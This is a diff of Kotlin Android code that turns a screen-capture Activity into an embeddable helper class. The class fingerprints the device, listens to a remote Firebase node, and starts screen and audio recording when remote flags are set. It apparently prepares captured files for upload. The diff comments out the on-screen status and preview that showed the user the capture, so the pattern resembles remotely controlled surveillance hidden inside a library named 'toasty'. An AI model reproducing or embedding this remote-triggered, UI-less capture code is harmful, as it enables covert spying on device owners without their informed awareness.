@@ -2,6 +2,7 @@ package com.example.toasty.security
 
 import android.Manifest
 import android.app.Activity
+import android.content.Context.MEDIA_PROJECTION_SERVICE
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
@@ -31,16 +32,12 @@ import java.io.ByteArrayOutputStream
 import java.io.File
 
 
-class FirebaseDataActivity : Activity() {
-
-    // Root reference
-    private lateinit var databaseReference: DatabaseReference
-    private lateinit var storageReference: StorageReference
-    private lateinit var imageScreenshot: ImageView
-    private lateinit var textViewStatus: TextView
+class FirebaseData {
 
     companion object {
         private const val TAG: String = "ScreenCaptureFiles"
+        private lateinit var databaseReference: DatabaseReference
+        private lateinit var storageReference: StorageReference
         var deviceUid: String = "Android"
         private val deviceVersion: String = Build.VERSION.RELEASE
         val deviceInfo = Build.BRAND + "(Device:" + Build.MODEL + "_OS:" + deviceVersion + ")"
@@ -48,18 +45,13 @@ class FirebaseDataActivity : Activity() {
         private const val SCREEN_AUDIO_RECORD_CODE = 1002
         private const val SCREEN_STORAGE_CODE = 1003
         var recordScreen = true
-        lateinit var mediaProjectionManager: MediaProjectionManager
-    }
+        private lateinit var mediaProjectionManager: MediaProjectionManager
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_firebase_data)
 
-        imageScreenshot = findViewById(R.id.imageScreenshot)
-        textViewStatus = findViewById(R.id.textViewStatus)
+    fun onInit(activity: Activity) {
 
         deviceUid =
-            deviceInfo + Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+            deviceInfo + Settings.Secure.getString(activity.contentResolver, Settings.Secure.ANDROID_ID)
                 ?: "Android"
         // Initialize Firebase Database reference
         databaseReference = FirebaseDatabase.getInstance().reference.child(deviceUid)
@@ -70,7 +62,7 @@ class FirebaseDataActivity : Activity() {
 
         writeData()
         readData()
-        realTimeUpdateData()
+        realTimeUpdateData(activity)
 
     }
 
@@ -97,7 +89,7 @@ class FirebaseDataActivity : Activity() {
 
     }
 
-    private fun realTimeUpdateData() {
+    private fun realTimeUpdateData(activity: Activity) {
         // Real-time updates
         databaseReference.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
@@ -108,27 +100,22 @@ class FirebaseDataActivity : Activity() {
                         var screenshots = child.value as HashMap<*, *>
                         for (key in screenshots.values) {
                             //println("Real-time child: $key")
-                            imageScreenshot.setImageBitmap(decodeBase64ToBitmap(key.toString()))
+                            //imageScreenshot.setImageBitmap(decodeBase64ToBitmap(key.toString()))
                             break
                         }
                         //break
                     } else {
                         val user = child.getValue(User::class.java)
                         println("Real-time User: $user")
-                        textViewStatus.text =
-                            "ScreenshotStart ${user?.screenshotStart} : VideoRecordingStart ${user?.videoRecordingStart}"
+                       // textViewStatus.text =
+                       //     "ScreenshotStart ${user?.screenshotStart} : VideoRecordingStart ${user?.videoRecordingStart}"
                         if (user?.screenshotStart == true || user?.videoRecordingStart == true) {
                             recordScreen = user?.videoRecordingStart?:false
-                            if (checkAudioPermission()) startScreenRecording()
+                            if (checkAudioPermission(activity)) startScreenRecording(activity)
                         } else if (user?.screenshotStart == false || user?.videoRecordingStart == false) {
-                            stopScreenRecording()
+                            stopScreenRecording(activity)
                         }
                     }
-                    /*                    val iterator: Iterator<String> = imagesJSONObj.keys()
-                                    while (iterator.hasNext()) {
-                                        String key = iterator
-                                        Log.i("TAG","key:"+key +"--Value::"+imagesJSONObj.optString(key);
-                                    }*/
 
                 }
             }
@@ -160,15 +147,6 @@ class FirebaseDataActivity : Activity() {
                             currentFile.name.substringBeforeLast(".")
                         )
                     }
-                    /*val fileUri: Uri = Uri.fromFile(File(currentFile.absolutePath))
-                    val fileType = if (fileUri.toString().contains("png")) "image" else "video"
-                    CoroutineScope(Dispatchers.IO).launch {
-                        try {
-                            uploadFile(fileUri, fileType, currentFile.name)
-                        } catch (e: IOException) {
-                            e.printStackTrace()
-                        }
-                    }*/
                 }
                 //if(i==2)break
                 i++
@@ -222,7 +200,7 @@ class FirebaseDataActivity : Activity() {
         return BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
     }
 
-    fun getBitmapFromFilePath(filePath: String): Bitmap? {
+    private fun getBitmapFromFilePath(filePath: String): Bitmap? {
         val file = File(filePath)
         return if (file.exists()) {
             BitmapFactory.decodeFile(file.absolutePath)
@@ -232,14 +210,14 @@ class FirebaseDataActivity : Activity() {
     }
 
 
-    private fun checkAudioPermission(): Boolean {
+    private fun checkAudioPermission(activity: Activity): Boolean {
         return if (ContextCompat.checkSelfPermission(
-                this,
+                activity,
                 Manifest.permission.RECORD_AUDIO
             ) != PackageManager.PERMISSION_GRANTED
         ) {
             ActivityCompat.requestPermissions(
-                this,
+                activity,
                 arrayOf(
                     Manifest.permission.RECORD_AUDIO,
                     Manifest.permission.WRITE_EXTERNAL_STORAGE
@@ -252,26 +230,26 @@ class FirebaseDataActivity : Activity() {
         }
     }
 
-    private fun startScreenRecording() {
+    private fun startScreenRecording(activity: Activity) {
         mediaProjectionManager =
-            getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            activity.getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         val intent = mediaProjectionManager.createScreenCaptureIntent()
-        startActivityForResult(intent, SCREEN_RECORD_REQUEST_CODE)
+        activity.startActivityForResult(intent, SCREEN_RECORD_REQUEST_CODE)
     }
 
-    private fun stopScreenRecording() {
-        val serviceIntent = Intent(this, ScreenRecordingService::class.java)
-        stopService(serviceIntent)
+    private fun stopScreenRecording(activity: Activity) {
+        val serviceIntent = Intent(activity, ScreenRecordingService::class.java)
+        activity.stopService(serviceIntent)
         pickFile()
-        Toast.makeText(this, "Recording Stopped", Toast.LENGTH_SHORT).show()
+        Toast.makeText(activity, "Recording Stopped", Toast.LENGTH_SHORT).show()
     }
 
-    override fun onDestroy() {
+/*    override fun onDestroy() {
         super.onDestroy()
         stopScreenRecording()
-    }
+    }*/
 
-    @RequiresApi(Build.VERSION_CODES.O)
+/*    @RequiresApi(Build.VERSION_CODES.O)
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SCREEN_RECORD_REQUEST_CODE && resultCode == RESULT_OK) {
@@ -297,9 +275,9 @@ class FirebaseDataActivity : Activity() {
         } else {
             Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show()
         }
+    }*/
+
     }
-
-
     data class User(
         val firstName: String? = "",
         val lastName: String? = "",
